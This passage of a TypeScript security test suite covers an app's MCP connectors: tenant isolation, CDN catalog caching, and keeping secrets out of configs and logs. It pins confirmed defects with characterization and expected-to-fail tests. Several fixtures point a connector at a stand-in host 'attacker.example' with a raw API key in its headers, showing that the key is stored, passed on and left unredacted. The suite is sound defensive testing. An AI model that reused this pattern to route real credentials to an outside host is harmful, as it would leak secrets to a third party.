          { serverName: "x", displayName: "X", transport: "http", url: "https://x.example/mcp" },
          OTHER_COMPANY,
        ),
    ],
    ["patch", (app: express.Express) => patchConnector(app, { status: "disabled" }, OTHER_COMPANY)],
    [
      "bind credentials",
      (app: express.Express) => bindCredentials(app, { secretRef: "mcp:notion" }, OTHER_COMPANY),
    ],
    ["list", (app: express.Express) => listConnectors(app, OTHER_COMPANY)],
  ])("a board actor from another company is refused on %s", async (_l, call) => {
    deploymentMode = "local_trusted";
    const res = await call(makeApp(founderActor)); // actor's companyIds = [COMPANY]
    expect(res.status).toBe(403);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
    expect(mockConnectorSvc.update).not.toHaveBeenCalled();
    expect(mockConnectorSvc.updateIfStatus).not.toHaveBeenCalled();
  });

  // `svc.getById` keys on the connector id ALONE, so nothing but the handler's
  // own `existing.companyId !== companyId` check stands between a founder and
  // another tenant's row. These pin that check on every route that reads one.
  it.each([
    ["patch", (app: express.Express) => patchConnector(app, { status: "disabled" })],
    [
      "bind credentials",
      (app: express.Express) => bindCredentials(app, { secretRef: "mcp:notion" }),
    ],
    ["delete", (app: express.Express) =>
      request(app).delete(`/api/companies/${COMPANY}/mcp-connectors/${CONNECTOR_ID}`)],
    ["replace agents", (app: express.Express) =>
      request(app)
        .put(`/api/companies/${COMPANY}/mcp-connectors/${CONNECTOR_ID}/agents`)
        .send({ agentIds: [] })],
  ])(
    "%s: a connector id that resolves to ANOTHER company's row is a 404, never a cross-tenant write",
    async (_l, call) => {
      deploymentMode = "local_trusted";
      // The founder of COMPANY guesses a connector id owned by OTHER_COMPANY.
      mockConnectorSvc.getById.mockResolvedValue({
        id: CONNECTOR_ID,
        companyId: OTHER_COMPANY,
        status: "active",
        requiresSecret: false,
        secretRef: null,
      });
      const res = await call(makeApp(founderActor));
      expect(res.status).toBe(404);
      expect(mockConnectorSvc.update).not.toHaveBeenCalled();
      expect(mockConnectorSvc.updateIfStatus).not.toHaveBeenCalled();
      expect(mockConnectorSvc.remove).not.toHaveBeenCalled();
      expect(mockConnectorSvc.replaceAgents).not.toHaveBeenCalled();
    },
  );

  it("the outsider fixture is a real board actor — it is not being refused for being malformed", async () => {
    // Control for the block above: the same actor shape succeeds on its OWN
    // company, so the 403s are the tenancy gate, not a broken fixture.
    deploymentMode = "local_trusted";
    const res = await createByo(
      makeApp(outsider),
      {
        serverName: "ok",
        displayName: "OK",
        transport: "http",
        url: "https://ok.example/mcp",
      },
      OTHER_COMPANY,
    );
    expect(res.status).toBe(201);
  });

  it("binding a secret is scoped to the connector's company (no cross-tenant secret reuse)", async () => {
    deploymentMode = "local_trusted";
    mockConnectorSvc.getById.mockResolvedValue({
      id: CONNECTOR_ID,
      companyId: COMPANY,
      status: "needs_credentials",
      requiresSecret: true,
      secretRef: null,
    });
    mockConnectorSvc.updateIfStatus.mockResolvedValue({ id: CONNECTOR_ID });
    await bindCredentials(makeApp(founderActor), { secretRef: "mcp:notion" });
    expect(mockSecretSvc.getByName).toHaveBeenCalledWith(COMPANY, "mcp:notion");
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// INVARIANT 8 — a malformed CDN response must not destroy a good shelf
// ═══════════════════════════════════════════════════════════════════════════

describe("[inv-8] CDN responses and the cached shelf", () => {
  const URL_ = "https://cdn.example.test/connectors.json";
  const T0 = 1_700_000_000_000;

  const rawEntry = (id: string, extra: Record<string, unknown> = {}) => ({
    id,
    displayName: id,
    serverName: id,
    transport: "http",
    url: `https://${id}.example.test/mcp`,
    ...extra,
  });

  const okJson = (body: unknown) => ({ ok: true, status: 200, json: async () => body });

  function svcWith(bodyRef: { current: unknown }) {
    const fetchFn = vi.fn(async () => okJson(bodyRef.current));
    return {
      fetchFn,
      svc: createConnectorCatalogService({
        url: URL_,
        fetchFn: fetchFn as unknown as typeof fetch,
      }),
    };
  }

  it("a malformed ENVELOPE keeps the good cache, reports stale, and does NOT pin it", async () => {
    const body = { current: { entries: [rawEntry("alpha"), rawEntry("beta")] } as unknown };
    const { svc, fetchFn } = svcWith(body);

    const first = await svc.load(T0);
    expect(first.entries.map((e) => e.id)).toEqual(["alpha", "beta"]);

    body.current = "<!doctype html><h1>503</h1>"; // a CDN error page
    const second = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS);
    expect(second.entries.map((e) => e.id)).toEqual(["alpha", "beta"]);
    expect(second.stale).toBe(true);

    // fetchedAtMs was NOT refreshed, so the very next load retries rather than
    // pinning the failure for another 6h.
    body.current = { entries: [rawEntry("alpha"), rawEntry("beta"), rawEntry("gamma")] };
    const third = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS + 1);
    expect(fetchFn).toHaveBeenCalledTimes(3);
    expect(third.entries.map((e) => e.id)).toEqual(["alpha", "beta", "gamma"]);
    expect(third.stale).toBe(false);
  });

  it.each([
    ["a bare array", []],
    ["a JSON string", "nope"],
    ["null", null],
    ["an object with no entries key", { items: [] }],
    ["entries as an object", { entries: { a: 1 } }],
    ["entries as a string", { entries: "alpha" }],
  ])("%s is a malformed envelope — the cache survives", async (_l, malformed) => {
    const body = { current: { entries: [rawEntry("alpha")] } as unknown };
    const { svc } = svcWith(body);
    await svc.load(T0);
    body.current = malformed;
    const res = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS);
    expect(res.entries.map((e) => e.id)).toEqual(["alpha"]);
    expect(res.stale).toBe(true);
  });

  it("a network failure keeps the good cache and reports stale", async () => {
    const fetchFn = vi
      .fn()
      .mockResolvedValueOnce(okJson({ entries: [rawEntry("alpha")] }))
      .mockRejectedValueOnce(new Error("ECONNRESET"));
    const svc = createConnectorCatalogService({
      url: URL_,
      fetchFn: fetchFn as unknown as typeof fetch,
    });
    await svc.load(T0);
    const res = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS);
    expect(res).toEqual({ entries: expect.any(Array), stale: true });
    expect(res.entries.map((e) => e.id)).toEqual(["alpha"]);
  });

  it("a non-2xx response is never parsed as 'the shelf is empty'", async () => {
    const fetchFn = vi
      .fn()
      .mockResolvedValueOnce(okJson({ entries: [rawEntry("alpha")] }))
      .mockResolvedValueOnce({ ok: false, status: 503, json: async () => ({ entries: [] }) });
    const svc = createConnectorCatalogService({
      url: URL_,
      fetchFn: fetchFn as unknown as typeof fetch,
    });
    await svc.load(T0);
    const res = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS);
    expect(res.entries.map((e) => e.id)).toEqual(["alpha"]);
    expect(res.stale).toBe(true);
  });

  it("CONTROL: a legitimately EMPTY shelf does replace the cache — a withdrawn connector must vanish", async () => {
    const body = { current: { entries: [rawEntry("alpha")] } as unknown };
    const { svc } = svcWith(body);
    await svc.load(T0);
    body.current = { entries: [] };
    const res = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS);
    expect(res.entries).toEqual([]);
    expect(res.stale).toBe(false);
    // ...and this is the state that MUST stay distinguishable from the one below.
    expect(parseMcpConnectorCatalog({ entries: [] })).toEqual({
      entries: [],
      dropped: [],
      malformed: false,
    });
  });

  // ── [ESC-6] CONFIRMED DEFECT ────────────────────────────────────────────
  // One purely ADDITIVE optional field on every entry (the schema is `.strict()`)
  // drops 100% of them. `malformed` stays false, so the cache layer accepts the
  // empty result as a real CDN answer: the shelf is emptied, reported FRESH, and
  // pinned for another 6h. Every older instance in a self-hosted fleet loses its
  // whole connector shelf from one forward-compatible CDN publish.
  it("CHARACTERIZATION [ESC-6]: an additive field drops every entry and the parse looks clean", () => {
    const withIcon = [
      rawEntry("alpha", { iconUrl: "https://cdn/x.png" }),
      rawEntry("beta", { iconUrl: "https://cdn/x.png" }),
    ];
    const result = parseMcpConnectorCatalog({ entries: withIcon });
    expect(result.entries).toEqual([]);
    expect(result.dropped).toEqual(["alpha", "beta"]);
    // This is the discarded signal: `dropped.length > 0 && entries.length === 0`
    // is distinguishable from a curator emptying the shelf (dropped.length === 0).
    expect(result.malformed).toBe(false);
  });

  it("CHARACTERIZATION [ESC-6]: the emptied shelf replaces the cache, reads FRESH, and pins for the TTL", async () => {
    const body = { current: { entries: [rawEntry("alpha"), rawEntry("beta")] } as unknown };
    const { svc, fetchFn } = svcWith(body);
    await svc.load(T0);

    body.current = {
      entries: [rawEntry("alpha", { iconUrl: "x" }), rawEntry("beta", { iconUrl: "x" })],
    };
    const emptied = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS);
    expect(emptied.entries).toEqual([]);
    expect(emptied.stale).toBe(false); // the founder is told this shelf is healthy

    // fetchedAtMs WAS refreshed -> no retry for another full TTL.
    const pinned = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS + 1);
    expect(fetchFn).toHaveBeenCalledTimes(2);
    expect(pinned.entries).toEqual([]);
    expect(pinned.stale).toBe(false);
  });

  // DESIRED STATE. Delete `.fails` when the fix lands (see [ESC-6] in the report).
  // The fix is a design decision because `mcp-connector-catalog-service.test.ts:282`
  // deliberately asserts the opposite ("an all-dropped payload still replaces the
  // cache — every entry was answered for"), so flipping it must be an explicit call.
  it.fails(
    "[ESC-6] DESIRED: kept-zero/dropped-many must be treated like a malformed envelope",
    async () => {
      const body = { current: { entries: [rawEntry("alpha"), rawEntry("beta")] } as unknown };
      const { svc, fetchFn } = svcWith(body);
      await svc.load(T0);

      body.current = {
        entries: [rawEntry("alpha", { iconUrl: "x" }), rawEntry("beta", { iconUrl: "x" })],
      };
      const res = await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS);

      expect(res.entries.map((e) => e.id)).toEqual(["alpha", "beta"]); // cache survives
      expect(res.stale).toBe(true); // and the founder is told so
      await svc.load(T0 + CONNECTOR_CATALOG_TTL_MS + 1);
      expect(fetchFn).toHaveBeenCalledTimes(3); // not pinned
    },
  );

  it("INVARIANT 7: a connectors.json entry is not a marketplace item and never enters catalog.json's parse", () => {
    // The whole reason connectors ship in their own file. A marketplace-shaped
    // item is DROPPED by the connector parser rather than mutating it, and a
    // connector entry carries no `type` the marketplace enum could choke on.
    const marketplaceItem = { id: "some-skill", type: "skill", name: "Some Skill" };
    const result = parseMcpConnectorCatalog({
      entries: [marketplaceItem, rawEntry("alpha")],
    });
    expect(result.entries.map((e) => e.id)).toEqual(["alpha"]);
    expect(result.dropped).toEqual(["some-skill"]);
    expect(result.malformed).toBe(false);
    expect(Object.keys(result.entries[0])).not.toContain("type");
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// [ESC-3] D7 is create-time only — delivery never re-asks
// ═══════════════════════════════════════════════════════════════════════════

describe("[ESC-3] D7 is evaluated at CREATE time and never again at delivery", () => {
  const stdioLocalRow = {
    id: "conn-local",
    status: "active",
    transport: "stdio",
    source: "byo",
    trustTier: undefined as string | undefined,
  };

  it("CHARACTERIZATION: a stdio/byo connector created under local_trusted is inadmissible once the host is authenticated", () => {
    expect(() => assertTransportAllowed("stdio", "local_trusted", "byo", undefined)).not.toThrow();
    expect(() => assertTransportAllowed("stdio", "authenticated", "byo", undefined)).toThrow(
      D7_REFUSAL,
    );
  });

  it("CHARACTERIZATION: yet the delivery selector still hands it to an opted-in agent", () => {
    const rows = selectConnectorRowsForAgent({
      connectors: [stdioLocalRow],
      enabledConnectorIds: new Set(["conn-local"]),
      isCommander: false,
    });
    expect(rows.map((r) => r.id)).toEqual(["conn-local"]);
  });

  it("CHARACTERIZATION: and to Commander, which is exempt from the per-agent opt-in (D3)", () => {
    const rows = selectConnectorRowsForAgent({
      connectors: [stdioLocalRow],
      enabledConnectorIds: new Set(),
      isCommander: true,
    });
    expect(rows.map((r) => r.id)).toEqual(["conn-local"]);
  });

  it("CHARACTERIZATION: and buildConnectorSpecs emits a live stdio spec with no skip recorded", () => {
    const { specs, skipped } = buildConnectorSpecs([
      {
        serverName: "localtool",
        transport: "stdio",
        url: null,
        command: "npx",
        args: ["-y", "some-pkg"],
        headerTemplate: {},
        envTemplate: {},
        secretValue: null,
      },
    ]);
    expect(specs.localtool).toEqual({
      kind: "stdio",
      command: "npx",
      args: ["-y", "some-pkg"],
      env: {},
    });
    expect(skipped).toEqual([]);
  });

  // DESIRED STATE. Delete `.fails` when a delivery-time re-gate (or a
  // mode-transition sweep) lands. FU-1 already names a "D7 block" skip reason
  // that `ConnectorSkipReason` does not actually have.
  it.fails(
    "[ESC-3] DESIRED: delivery must drop a connector the CURRENT host would refuse to create",
    () => {
      const rows = selectConnectorRowsForAgent({
        connectors: [stdioLocalRow],
        enabledConnectorIds: new Set(["conn-local"]),
        isCommander: false,
        // The selector does not accept a deployment mode at all today — that is
        // precisely the gap. When it does, this call site is the contract.
        ...({ deploymentMode: "authenticated" } as Record<string, unknown>),
      });
      expect(rows).toEqual([]);
    },
  );
});

// ═══════════════════════════════════════════════════════════════════════════
// INVARIANT 5 — secret VALUES must never reach a config artifact
// ═══════════════════════════════════════════════════════════════════════════

describe("[inv-5] catalog installs never carry a secret value", () => {
  it("a catalog install persists template KEYS with empty values and a null secretRef", async () => {
    deploymentMode = "local_trusted";
    const res = await install(makeApp(founderActor), { entryId: "notion" });
    expect(res.status).toBe(201);
    expect(persistedInsert().headerTemplate).toEqual({ Authorization: "" });
    expect(persistedInsert().secretRef).toBeNull();
  });

  it("the shelf response exposes key NAMES only — never a materialised template", async () => {
    const shelf = await request(makeApp(founderActor)).get(
      `/api/companies/${COMPANY}/mcp-connectors/catalog`,
    );
    const serialised = JSON.stringify(shelf.body);
    expect(serialised).not.toMatch(/"headerTemplate"/);
    expect(serialised).not.toMatch(/"envTemplate"/);
    expect(serialised).not.toMatch(/"secretRef"/);
  });

  it("buildConnectorSpecs puts the real secret ONLY in the env map, never in a spec", () => {
    const { specs, env } = buildConnectorSpecs([
      {
        serverName: "notion",
        transport: "http",
        url: "https://mcp.notion.example/mcp",
        command: null,
        args: [],
        headerTemplate: { Authorization: "Bearer ${TOKEN}" },
        envTemplate: {},
        secretValue: "sk-live-REAL-SECRET",
      },
    ]);
    expect(JSON.stringify(specs)).not.toMatch(/sk-live-REAL-SECRET/);
    expect(JSON.stringify(specs)).toMatch(/\$\{AOA_MCP_NOTION_TOKEN\}/);
    expect(env).toEqual({ AOA_MCP_NOTION_TOKEN: "sk-live-REAL-SECRET" });
  });

  it("a skipped row's secret never leaks into the env map either", () => {
    // The env write MUST stay below the transport branch — hoisting it would put
    // a live credential in the spawn env for a connector with no config entry.
    const { specs, env, skipped } = buildConnectorSpecs([
      {
        serverName: "broken",
        transport: "http",
        url: null, // -> skipped
        command: null,
        args: [],
        headerTemplate: {},
        envTemplate: {},
        secretValue: "sk-live-REAL-SECRET",
      },
    ]);
    expect(skipped).toEqual([{ serverName: "broken", reason: "missing_url" }]);
    expect(specs).toEqual({});
    expect(env).toEqual({});
  });

  it("`${TOKEN}` is the ONE substituted placeholder — anything else ships verbatim", () => {
    // This is why the founder-facing hint MUST say ${TOKEN}: a connector
    // configured with any other placeholder authenticates as no-one.
    const { specs } = buildConnectorSpecs([
      {
        serverName: "notion",
        transport: "http",
        url: "https://mcp.notion.example/mcp",
        command: null,
        args: [],
        headerTemplate: { A: "Bearer ${TOKEN}", B: "Bearer ${MCP_TOKEN}", C: "Bearer ${VAR}" },
        envTemplate: {},
        secretValue: "sk",
      },
    ]);
    const headers = (specs.notion as { headers: Record<string, string> }).headers;
    expect(headers.A).toBe("Bearer ${AOA_MCP_NOTION_TOKEN}");
    expect(headers.B).toBe("Bearer ${MCP_TOKEN}"); // NOT substituted
    expect(headers.C).toBe("Bearer ${VAR}"); // NOT substituted
  });

  it("FIXED: the Settings header hint names ${TOKEN}, the only placeholder that resolves", () => {
    // Regression guard for the fix landed with this suite. The old hint read
    // `Authorization: Bearer ${MCP_TOKEN}`, which substitutes to nothing — so a
    // founder following the app's own example built a connector that
    // authenticates as no-one, and the obvious workaround is pasting the real
    // token (see [ESC-4]).
    const here = dirname(fileURLToPath(import.meta.url));
    const src = readFileSync(
      resolvePath(here, "../../../ui/src/components/settings/sections/MCPConnectorsSection.tsx"),
      "utf8",
    );
    expect(src).toMatch(/Authorization: Bearer \$\{TOKEN\}/);
    expect(src).not.toMatch(/\$\{MCP_TOKEN\}/);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// [ESC-4] a raw credential typed into headerTemplate is accepted end-to-end
// ═══════════════════════════════════════════════════════════════════════════

const RAW_SECRET = "sk-live-REALSECRET-0xdeadbeef";

describe("[ESC-4] a literal credential in headerTemplate / envTemplate / args", () => {
  it("CHARACTERIZATION: the BYO route accepts it and persists it verbatim (plain jsonb, not company_secrets)", async () => {
    deploymentMode = "local_trusted";
    const res = await createByo(makeApp(founderActor), {
      serverName: "alpha",
      displayName: "Alpha",
      transport: "http",
      url: "https://attacker.example/mcp",
      headerTemplate: { "X-Api-Key": RAW_SECRET },
    });
    expect(res.status).toBe(201);
    expect(persistedInsert().headerTemplate).toEqual({ "X-Api-Key": RAW_SECRET });
  });

  it("CHARACTERIZATION: the stdio shape (args + envTemplate) is accepted too", async () => {
    deploymentMode = "local_trusted";
    const res = await createByo(makeApp(founderActor), {
      serverName: "beta",
      displayName: "Beta",
      transport: "stdio",
      command: "npx",
      args: ["-y", "tool", "--token", RAW_SECRET],
      envTemplate: { BETA_TOKEN: RAW_SECRET },
    });
    expect(res.status).toBe(201);
    expect(persistedInsert().args).toEqual(["-y", "tool", "--token", RAW_SECRET]);
    expect(persistedInsert().envTemplate).toEqual({ BETA_TOKEN: RAW_SECRET });
  });

  it("CHARACTERIZATION: it then flows verbatim into the adapter spec that config writers serialise", () => {
    const { specs } = buildConnectorSpecs([
      {
        serverName: "alpha",
        transport: "http",
        url: "https://attacker.example/mcp",
        command: null,
        args: [],
        headerTemplate: { "X-Api-Key": RAW_SECRET },
        envTemplate: {},
        secretValue: null,
      },
    ]);
    expect(JSON.stringify(specs)).toContain(RAW_SECRET);
  });

  it("CHARACTERIZATION: the list route is board-wide (assertBoard only) — a team_member reads it back", async () => {
    mockGetEffectiveRole.mockResolvedValue("team_member");
    mockConnectorSvc.list.mockResolvedValue([
      { id: CONNECTOR_ID, serverName: "alpha", headerTemplate: { "X-Api-Key": RAW_SECRET } },
    ]);
    const res = await listConnectors(makeApp(founderActor));
    expect(res.status).toBe(200);
    expect(JSON.stringify(res.body)).toContain(RAW_SECRET);
    // No founder gate was even consulted on this route.
    expect(mockGetEffectiveRole).not.toHaveBeenCalled();
  });

  it("CHARACTERIZATION: log redaction does not mask it — the patterns are anchored", () => {
    const redacted = redactSensitiveBodyFields({
      serverName: "alpha",
      headerTemplate: { "X-Api-Key": RAW_SECRET, Authorization: RAW_SECRET },
      envTemplate: { BETA_TOKEN: RAW_SECRET },
      args: ["--token", RAW_SECRET],
    });
    const s = JSON.stringify(redacted);
    expect(s).toContain(RAW_SECRET); // X-Api-Key / BETA_TOKEN / args survive
    expect(s).toMatch(/"Authorization":"\[REDACTED\]"/); // only the exact key matches
  });

  // DESIRED STATE — [ESC-4]. Three independent halves, each its own decision.
  it.fails("[ESC-4a] DESIRED: create rejects a literal credential in headerTemplate", async () => {
    deploymentMode = "local_trusted";
    const res = await createByo(makeApp(founderActor), {
      serverName: "alpha",
      displayName: "Alpha",
      transport: "http",
      url: "https://attacker.example/mcp",
      headerTemplate: { "X-Api-Key": RAW_SECRET },
    });
    expect(res.status).toBe(400);
  });

  it.fails("[ESC-4b] DESIRED: redaction masks header-ish key names, not just exact matches", () => {
    const s = JSON.stringify(
      redactSensitiveBodyFields({ headerTemplate: { "X-Api-Key": RAW_SECRET } }),
    );
    expect(s).not.toContain(RAW_SECRET);
  });

  it.fails("[ESC-4c] DESIRED: the list route does not return raw templates to a non-founder", async () => {
    mockGetEffectiveRole.mockResolvedValue("team_member");
    mockConnectorSvc.list.mockResolvedValue([
      { id: CONNECTOR_ID, serverName: "alpha", headerTemplate: { "X-Api-Key": RAW_SECRET } },
    ]);
    const res = await listConnectors(makeApp(founderActor));
    expect(JSON.stringify(res.body)).not.toContain(RAW_SECRET);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// [ESC-5] claude_local silently drops authTokenEnvVar
// ═══════════════════════════════════════════════════════════════════════════

describe("[ESC-5] the claude .mcp.json writer discards the credential signal", () => {
  const httpSpecWithToken = {
    kind: "http" as const,
    url: "https://mcp.notion.example/mcp",
    headers: { Authorization: "" }, // D5: catalog installs seed KEYS with empty values
    authTokenEnvVar: "AOA_MCP_NOTION_TOKEN",
  };

  const params = {
    companyId: "c",
    userId: "u",
    userRole: "founder",
    enabledCapabilities: [] as string[],
    bridgeEntrypoint: "/b.js",
  };

  it("CHARACTERIZATION: buildConnectorSpecs DOES emit authTokenEnvVar for a credentialed http row", () => {
    const { specs } = buildConnectorSpecs([
      {
        serverName: "notion",
        transport: "http",
        url: "https://mcp.notion.example/mcp",
        command: null,
        args: [],
        headerTemplate: { Authorization: "" },
        envTemplate: {},
        secretValue: "sk-notion-REAL",
      },
    ]);
    expect(specs.notion).toMatchObject({ authTokenEnvVar: "AOA_MCP_NOTION_TOKEN" });
  });

  // FIXED (FU-21): buildMcpConfig now REWRITES the empty-valued Authorization
  // header to reference the token env var, rather than dropping the signal.
  it("[ESC-5] FIXED: buildMcpConfig overwrites the empty Authorization with the token reference", () => {
    const config = buildMcpConfig({
      ...params,
      extraMcpServers: { notion: httpSpecWithToken } as never,
    });
    expect(config.mcpServers.notion).toEqual({
      type: "http",
      url: "https://mcp.notion.example/mcp",
      headers: { Authorization: "Bearer ${AOA_MCP_NOTION_TOKEN}" },
    });
  });

  // FIXED (FU-21): an EMPTY headerTemplate + a bound secret now synthesises the
  // conventional bearer header instead of an unauthenticated remote server.
  it("[ESC-5] FIXED: an empty headers map gains the synthesised bearer header", () => {
    const config = buildMcpConfig({
      ...params,
      extraMcpServers: { acme: { ...httpSpecWithToken, headers: {} } } as never,
    });
    expect(config.mcpServers.acme).toEqual({
      type: "http",
      url: "https://mcp.notion.example/mcp",
      headers: { Authorization: "Bearer ${AOA_MCP_NOTION_TOKEN}" },
    });
    expect(Object.keys(config)).toEqual(["mcpServers"]);
  });

  // DESIRED STATE (commitment I3, already implemented for codex/opencode/gemini).
  it("[ESC-5] DESIRED: claude synthesises the conventional bearer header from authTokenEnvVar", () => {
    const config = buildMcpConfig({
      ...params,
      extraMcpServers: { notion: httpSpecWithToken } as never,
    });
    expect(config.mcpServers.notion).toMatchObject({
      headers: { Authorization: expect.stringContaining("AOA_MCP_NOTION_TOKEN") },
    });
  });

  it("[ESC-5] DESIRED: an empty-string header value is never emitted", () => {
    const config = buildMcpConfig({
      ...params,
      extraMcpServers: { notion: httpSpecWithToken } as never,
    });
    const headers = (config.mcpServers.notion as { headers: Record<string, string> }).headers;
    expect(Object.values(headers)).not.toContain("");
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// [ESC-7] the connector env-scrub module is dead code
// ═══════════════════════════════════════════════════════════════════════════

describe("[ESC-7] buildConnectorProcessEnv is documented as a control but has no production caller", () => {
  const here = dirname(fileURLToPath(import.meta.url));
  const repoRoot = resolvePath(here, "../../..");

  /** Grep for callers the way a reviewer would, excluding definitions + tests. */
  function productionCallers(): string[] {
    const { execFileSync } = require("node:child_process") as typeof import("node:child_process");
    let raw = "";
    try {
      raw = execFileSync(
        "git",
        ["grep", "-l", "-e", "buildConnectorProcessEnv", "-e", "mergeConnectorEnv", "--", "*.ts"],
        { cwd: repoRoot, encoding: "utf8" },
      );
    } catch {
      return []; // git grep exits 1 on no match
    }
    return raw
      .split("\n")
      .map((l) => l.trim())
      .filter(Boolean)
      .filter((f) => !f.includes("__tests__") && !f.endsWith("mcp-connectors-env.ts"));
  }

  it("CHARACTERIZATION: the module's only references are its own definition and its own unit test", () => {
    expect(productionCallers()).toEqual([]);
  });

  // DESIRED STATE. The module's header promises "AoA's own secrets must never
  // reach a third-party server"; today every connector-capable adapter spawns the
  // CLI with the full unscrubbed server environment, and the CLI passes it to each
  // stdio MCP child. Either wire this in or delete it — it currently reads as an
  // implemented control that is not implemented.
  it.fails("[ESC-7] DESIRED: at least one production module routes connector spawns through it", () => {
    expect(productionCallers().length).toBeGreaterThan(0);
  });
});
